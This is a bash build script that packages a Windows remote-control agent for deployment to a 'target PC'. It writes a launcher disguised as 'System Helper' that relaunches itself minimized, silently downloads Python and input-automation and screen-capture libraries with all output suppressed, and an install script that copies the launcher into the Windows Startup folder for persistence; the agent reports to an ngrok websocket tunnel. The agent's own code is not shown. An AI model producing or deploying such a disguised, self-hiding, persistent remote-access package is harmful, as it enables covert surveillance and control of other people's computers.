#!/bin/bash
# Build Windows agent using embedded Python

BASE_DIR="/Users/upreti/Documents/Nikshay_Automation/remote-desktop-app"
AGENT_DIR="$BASE_DIR/agent"

echo "Creating Windows deployment package..."
echo ""

# Create the deploy directory
DEPLOY_DIR="/tmp/windows_agent_deploy"
rm -rf "$DEPLOY_DIR"
mkdir -p "$DEPLOY_DIR"

# Copy agent script
cp "$AGENT_DIR/agent.py" "$DEPLOY_DIR/"

# Create config.json
cat > "$DEPLOY_DIR/config.json" << 'EOF'
{
  "server_url": "wss://deviation-tweak-charter.ngrok-free.dev",
  "agent_id": "",
  "agent_name": "",
  "jpg_quality": 50,
  "fps": 1
}
EOF

# Create launcher batch file (self-installing)
cat > "$DEPLOY_DIR/SystemHelper.bat" << 'BATSCRIPT'
@echo off
title System Helper
cd /d "%~dp0"
setlocal

:: Run hidden
if not "%1"=="--hidden" (
    start /min "" "%~f0" --hidden
    exit /b
)

:: Check for Python
where python >nul 2>&1
if %errorLevel% neq 0 (
    :: Download portable Python silently
    powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip', '%TEMP%\py.zip'); Expand-Archive '%TEMP%\py.zip' -DestinationPath '%~dp0py' -Force" >nul 2>&1
    
    :: Get pip
    powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://bootstrap.pypa.io/get-pip.py', '%TEMP%\get-pip.py')" >nul 2>&1
    "%~dp0py\python.exe" "%TEMP%\get-pip.py" --quiet >nul 2>&1
    
    :: Install dependencies
    "%~dp0py\python.exe" -m pip install pyautogui Pillow websocket-client --quiet >nul 2>&1
    
    :: Run agent with this Python
    "%~dp0py\python.exe" "%~dp0agent.py"
) else (
    pip install pyautogui Pillow websocket-client --quiet >nul 2>&1
    python "%~dp0agent.py"
)
BATSCRIPT

# Create auto-start registry script
cat > "$DEPLOY_DIR/install.bat" << 'INSTALLBAT'
@echo off
title System Helper Setup
cd /d "%~dp0"

:: Add to startup
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "SystemHelper.bat" "%STARTUP%\SystemHelper.bat" /Y >nul

:: Run now
start /min "" "SystemHelper.bat"

echo System Helper installed successfully.
echo It will auto-start when Windows starts.
timeout /t 3 /nobreak >nul
INSTALLBAT

# Package as zip
cd /tmp
zip -j "$BASE_DIR/agent/WindowsAgent.zip" "$DEPLOY_DIR/agent.py" "$DEPLOY_DIR/config.json" "$DEPLOY_DIR/SystemHelper.bat" "$DEPLOY_DIR/install.bat"

echo "=========================================="
echo "   WINDOWS DEPLOYMENT PACKAGE READY"
echo "=========================================="
echo ""
echo "File: $BASE_DIR/agent/WindowsAgent.zip"
echo ""
echo "Contents:"
echo "  - SystemHelper.bat    (double-click to run agent)"
echo "  - install.bat         (run once to auto-start with Windows)"
echo "  - agent.py            (the monitoring script)"
echo "  - config.json         (edit server_url if needed)"
echo ""
echo "DEPLOYMENT:"
echo "  1. Send WindowsAgent.zip to target PC"
echo "  2. Extract to any folder"
echo "  3. Run install.bat as Administrator (one time setup)"
echo "  4. Done! Agent is running and will auto-start"
echo ""
echo "The agent connects to:"
echo "  wss://deviation-tweak-charter.ngrok-free.dev"
echo ""
echo "=========================================="